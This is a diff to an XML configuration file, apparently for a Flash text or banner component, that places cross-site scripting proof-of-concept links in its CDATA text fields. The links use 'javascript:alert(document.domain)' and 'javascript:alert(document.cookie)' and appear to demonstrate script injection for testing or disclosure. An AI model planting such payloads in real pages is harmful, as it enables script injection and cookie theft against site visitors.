@@ -35,9 +35,9 @@
 	<buttontext graphicLinkage="arrowGraphic_mc" graphicX="2" graphicY="6" 
 	transitionDuration="1" easing1="easeInBack" easing2="easeInSine">
 	
-		<text id="1" x1="10" y1="26" x2="-5" y2="26"><![CDATA[<h1>Proof of concept 1 <a href='javascript:alert(document.domain)'>Click me (domain)</a></h1>]]></text>
-		<text id="2" x1="10" y1="26" x2="-5" y2="26"><![CDATA[<h1>Proof of concept 2 <a href='javascript:alert(document.cookie)'>Click me (cookie)</a></h1>]]></text>
-		<text id="3" x1="10" y1="26" x2="-5" y2="26"><![CDATA[<h1>Proof of concept 3 <a href='javascript:alert(document.domain)'>Click me (domain)</a></h1>]]></text>
+		<text id="1" x1="10" y1="26" x2="-5" y2="26"><![CDATA[<h1><a href='javascript:alert(document.domain)'>Proof of concept 1 Click me (domain)</a></h1>]]></text>
+		<text id="2" x1="10" y1="26" x2="-5" y2="26"><![CDATA[<h1><a href='javascript:alert(document.cookie)'>Proof of concept 2 Click me (cookie)</a></h1>]]></text>
+		<text id="3" x1="10" y1="26" x2="-5" y2="26"><![CDATA[<h1><a href='javascript:alert(document.domain)'>Proof of concept 3 Click me (domain)</a></h1>]]></text>
 		
 	</buttontext>
 	
@@ -68,9 +68,9 @@
 	<copy>
 	
 		<!-- TEXT 1 /////////////////////////////////////////////////////////////////////////////////////////////// -->	
-		<text id="1" x="35" y="80" w="400" h="400"><![CDATA[<h1>Generic copy 1</h1>]]></text>
-		<text id="2" x="35" y="80" w="400" h="400"><![CDATA[<h1>Generic copy 2</h1>]]></text>
-		<text id="3" x="35" y="80" w="400" h="400"><![CDATA[<h1>Proof of concept 3 <a href='javascript:alert(document.domain)'>Click me (domain)</a></h1>]]></text>
+		<text id="1" x="35" y="80" w="400" h="400"><![CDATA[<h1><a href='javascript:alert(document.domain)'>Proof of concept 1 Click me (domain)</a></h1>]]></text>
+		<text id="2" x="35" y="80" w="400" h="400"><![CDATA[<h1><a href='javascript:alert(document.cookie)'>Proof of concept 2 Click me (cookie)</a></h1>]]></text>
+		<text id="3" x="35" y="80" w="400" h="400"><![CDATA[<h1><a href='javascript:alert(document.domain)'>Proof of concept 3 Click me (domain)</a></h1>]]></text>
 
 	</copy>
 	
